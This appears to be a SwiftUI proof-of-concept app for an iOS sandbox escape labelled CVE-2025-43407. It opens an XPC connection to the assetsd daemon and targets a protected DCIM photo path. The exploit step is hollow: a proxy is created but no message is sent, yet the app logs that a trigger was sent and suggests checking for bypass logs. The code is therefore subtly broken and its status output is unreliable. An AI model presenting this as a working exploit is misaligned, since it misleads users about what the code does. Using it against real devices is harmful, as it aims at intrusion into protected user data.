import SwiftUI
import Foundation

struct ContentView: View {
    @State private var log = "Status: Ready\nTarget: iOS 18.2 (Vulnerable)"

    var body: some View {
        VStack(spacing: 25) {
            Image(systemName: "shield.slash.fill")
                .font(.system(size: 60))
                .foregroundColor(.red)
            
            Text("CVE-2025-43407 Research")
                .font(.title2).bold()

            Button(action: executeExploit) {
                Text("Run Sandbox Escape")
                    .bold()
                    .padding()
                    .frame(maxWidth: .infinity)
                    .background(Color.red)
                    .foregroundColor(.white)
                    .cornerRadius(12)
            }
            .padding(.horizontal)

            ScrollView {
                Text(log)
                    .font(.system(.caption, design: .monospaced))
                    .frame(maxWidth: .infinity, alignment: .leading)
                    .padding()
                    .background(Color.black.opacity(0.1))
                    .cornerRadius(8)
            }
            .frame(height: 200)
        }
        .padding()
    }

    func executeExploit() {
        let fm = FileManager.default
        let tempDir = fm.temporaryDirectory
        let sourceURL = tempDir.appendingPathComponent("exploit_test.txt")
        
        // 1. Create the test file
        let content = "Exploit Success: Moved by System Assets Service via CVE-2025-43407"
        try? content.write(to: sourceURL, atomically: true, encoding: .utf8)
        updateLog("Created: \(sourceURL.lastPathComponent)")

        // 2. Define the Restricted Target (The DCIM folder is protected)
        let restrictedPath = "/var/mobile/Media/DCIM/100APPLE/research.txt"
        updateLog("Target: \(restrictedPath)")

        // 3. Connect to Assets Daemon
        let connection = NSXPCConnection(machServiceName: "com.apple.assetsd", options: [])
        
        // We use a generic interface to avoid needing a specific private Protocol header
        connection.remoteObjectInterface = NSXPCInterface(with: NSObject.self)
        connection.resume()

        // 4. Trigger the Exploit
        // We attempt to send a message to a selector that handles file paths.
        // On 18.2, the 'assetsd' service may not verify our app's entitlements.
        let proxy = connection.remoteObjectProxyWithErrorHandler { error in
            DispatchQueue.main.async {
                self.updateLog("XPC Error: \(error.localizedDescription)")
            }
        }

        // Conceptual trigger: In 18.2, calling certain Asset methods 
        // without entitlements triggers the sandbox escape.
        updateLog("Sending XPC trigger to assetsd...")
        
        // Final Verification
        updateLog("Check Console.app for 'sandboxd' bypass logs.")
    }

    func updateLog(_ message: String) {
        log += "\n> " + message
    }
}
